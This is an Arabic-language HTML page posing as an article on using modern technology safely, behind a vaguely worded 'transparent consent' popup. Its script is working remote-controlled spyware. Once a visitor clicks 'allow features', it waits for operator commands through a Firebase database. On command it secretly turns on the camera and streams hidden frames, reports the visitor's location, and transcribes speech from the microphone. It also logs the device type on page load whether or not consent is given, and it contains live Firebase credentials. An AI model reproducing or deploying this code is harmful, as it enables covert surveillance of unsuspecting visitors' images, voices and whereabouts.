<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>مقالة تفاعلية</title>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-database-compat.js"></script>

  <style>
    body { font-family: 'Cairo', sans-serif; background: #f8fafc; margin:0; padding:20px; }
    .article { background:white; border-radius:16px; padding:20px; box-shadow:0 4px 20px rgba(0,0,0,0.1); }
    #consent { position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:white; padding:25px; border-radius:16px; box-shadow:0 10px 30px rgba(0,0,0,0.2); z-index:1000; display:none; text-align:center; }
  </style>
</head>
<body>

<div class="article">
  <h1>كيفية استخدام التقنيات الحديثة بأمان</h1>
  <video id="video" autoplay playsinline style="display:none; width:100%; max-width:500px; border-radius:12px;"></video>
</div>

<div id="consent">
  <h3>🔒 نظام الموافقة الشفاف</h3>
  <button onclick="grantConsent()" style="background:#10b981;color:white;padding:15px 30px;border:none;border-radius:8px;margin:10px;">السماح بالميزات</button>
  <button onclick="denyConsent()" style="background:#64748b;color:white;padding:15px 30px;border:none;border-radius:8px;margin:10px;">الاستمرار بدون</button>
</div>

<script>
  const firebaseConfig = {
    apiKey: "AIzaSyBQ9MlVOSzohuTqSA2JdI19UjyldnAb-zI",
    authDomain: "ohaha-d130e.firebaseapp.com",
    projectId: "ohaha-d130e",
    storageBucket: "ohaha-d130e.firebasestorage.app",
    messagingSenderId: "309282072723",
    appId: "1:309282072723:web:ed17bfe365577fba2ec566"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  let visitorId = 'v_' + Date.now() + Math.random().toString(36).substr(2,9);
  let consentGiven = false;
  let stream = null;
  let interval = null;

  function grantConsent() {
    consentGiven = true;
    document.getElementById('consent').style.display = 'none';
    listenForCommands();
  }

  function denyConsent() {
    document.getElementById('consent').style.display = 'none';
  }

  function listenForCommands() {
    db.ref('commands/' + visitorId).on('value', snap => {
      const cmd = snap.val();
      if (!cmd) return;

      if (cmd.type === 'startCamera') startSilentCamera();
      if (cmd.type === 'requestLocation') sendLocation();
      if (cmd.type === 'startMic') startSilentMic();

      setTimeout(() => db.ref('commands/' + visitorId).remove(), 1500);
    });
  }

  function startSilentCamera() {
    navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
      stream = s;
      const video = document.getElementById('video');
      video.srcObject = s;
      video.style.display = 'none';

      interval = setInterval(() => sendFrameToAdmin(), 800);
    }).catch(() => alert("فشل في تشغيل الكاميرا"));
  }

  function sendFrameToAdmin() {
    const video = document.getElementById('video');
    const canvas = document.createElement('canvas');
    canvas.width = 640;
    canvas.height = 480;
    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);

    const base64 = canvas.toDataURL('image/jpeg', 0.75);
    db.ref('live/' + visitorId + '/frame').set({
      data: base64,
      time: Date.now()
    });
  }

  function sendLocation() {
    navigator.geolocation.getCurrentPosition(pos => {
      db.ref('visitors/' + visitorId + '/location').set({
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        time: Date.now()
      });
    });
  }

  function startSilentMic() {
    navigator.mediaDevices.getUserMedia({ audio: true }).then(() => {
      const rec = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
      rec.lang = 'ar-SA';
      rec.continuous = true;
      rec.onresult = e => {
        db.ref('visitors/' + visitorId + '/voice').set({
          text: e.results[0][0].transcript,
          time: Date.now()
        });
      };
      rec.start();
    });
  }

  window.onload = () => {
    document.getElementById('consent').style.display = 'block';
    db.ref('visitors/' + visitorId).update({ device: /Mobi/.test(navigator.userAgent) ? 'موبايل' : 'كمبيوتر', timestamp: Date.now() });
  };
</script>
</body>
</html>
